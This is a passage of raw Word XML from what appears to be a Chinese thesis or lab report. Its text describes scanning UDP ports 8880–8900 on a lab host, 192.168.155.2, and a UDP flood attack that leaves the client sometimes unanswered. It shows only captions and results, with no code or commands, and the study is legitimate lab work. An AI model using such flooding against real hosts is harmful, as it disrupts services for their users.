    <w:p w14:paraId="7018A572" w14:textId="29E2386D" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="00577D28">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74CDD29E" w14:textId="69BD34B8" w:rsidR="0097518D" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="008D142E">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="046B116E" w14:textId="0C3ED3B8" w:rsidR="00F83D93" w:rsidRPr="0034487A" w:rsidRDefault="00F83D93" w:rsidP="00F83D93">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1179" w:name="_Toc482141273"/>
      <w:bookmarkStart w:id="1180" w:name="_Toc482141946"/>
      <w:bookmarkStart w:id="1181" w:name="_Toc482522669"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>端口扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1179"/>
      <w:bookmarkEnd w:id="1180"/>
      <w:bookmarkEnd w:id="1181"/>
    </w:p>
    <w:p w14:paraId="55D0E3C3" w14:textId="42C3D877" w:rsidR="00715537" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="00C778AF">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>输入端口扫描的范围，这里为了方便展示，选择端口8</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>880</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>到8900。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57186253" w14:textId="236F2E67" w:rsidR="006A2F15" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="00385A30">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>图</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为192.168.155.2主机上</w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>UDP</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>服务情况。在扫描端口范围内有端口8888和8889开放。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61763AD2" w14:textId="60BCD766" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00385A30" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="358CB01F" wp14:editId="220A4E27">
            <wp:extent cx="4471847" cy="2453640"/>
            <wp:effectExtent l="0" t="0" r="5080" b="3810"/>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84374" cy="2460514"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C24704" w14:textId="5E18B3CE" w:rsidR="006A2F15" w:rsidRPr="009D0DB8" w:rsidRDefault="006C6D3B" w:rsidP="008D142E">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C778AF" w:rsidRPr="009D0DB8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>被攻击主机UDP端口使用情况</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C10BC38" w14:textId="2508FD4F" w:rsidR="006A2F15" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="0097518D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为端口扫描过程和结果，扫描结果正确。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A384CA" w14:textId="71667CE1" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="0097518D" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="03BEA4BC" wp14:editId="7EF26396">
            <wp:extent cx="4511040" cy="386738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586393" cy="3931982"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="619F145B" w14:textId="606F9B2E" w:rsidR="00204A45" w:rsidRPr="00450E61" w:rsidRDefault="006C6D3B" w:rsidP="00450E61">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="00B62D43">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>端口扫描</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B964FF2" w14:textId="6B68396E" w:rsidR="00BE0DCB" w:rsidRPr="0034487A" w:rsidRDefault="00BE0DCB" w:rsidP="00BE0DCB">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1182" w:name="_Toc482141274"/>
      <w:bookmarkStart w:id="1183" w:name="_Toc482141947"/>
      <w:bookmarkStart w:id="1184" w:name="_Toc482522670"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DP F</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lood攻击</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1182"/>
      <w:bookmarkEnd w:id="1183"/>
      <w:bookmarkEnd w:id="1184"/>
    </w:p>
    <w:p w14:paraId="465C72E3" w14:textId="50319F83" w:rsidR="00385A30" w:rsidRPr="0034487A" w:rsidRDefault="00715537" w:rsidP="00160F4D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>没有攻击前，U</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>DP</w:t>
      </w:r>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>客户端访问主机上服务器正常响应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6271CD" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00385A30" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>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067520C5" w14:textId="31997CA7" w:rsidR="00385A30" w:rsidRPr="00374504" w:rsidRDefault="006C6D3B" w:rsidP="00374504">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="00467A96">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>未攻击前UDP客户端连接情况</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348A362B" w14:textId="32D044F4" w:rsidR="00F506C2" w:rsidRPr="0034487A" w:rsidRDefault="006A2F15" w:rsidP="002F6465">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>攻击之后，UDP客户端访问主机上服务器有时会无法响应</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E04FCE" w14:textId="77777777" w:rsidR="006C6D3B" w:rsidRPr="0034487A" w:rsidRDefault="00385A30" w:rsidP="003F5BAF">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>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7D347E5B" w14:textId="0785F1E2" w:rsidR="009F06D1" w:rsidRPr="0081182A" w:rsidRDefault="006C6D3B" w:rsidP="003F5BAF">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图5</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="008E2EC8" w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:noProof/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A97D7F" w:rsidRPr="0081182A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>攻击后出现无法收到服务端回应的情况</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1284E98B" w14:textId="79A7E098" w:rsidR="00150B71" w:rsidRPr="0034487A" w:rsidRDefault="00150B71" w:rsidP="00593AC4">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1185" w:name="_Toc482141275"/>
      <w:bookmarkStart w:id="1186" w:name="_Toc482141948"/>
      <w:bookmarkStart w:id="1187" w:name="_Toc482522671"/>
      <w:r w:rsidRPr="0034487A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>本章小结</w:t>
      </w:r>
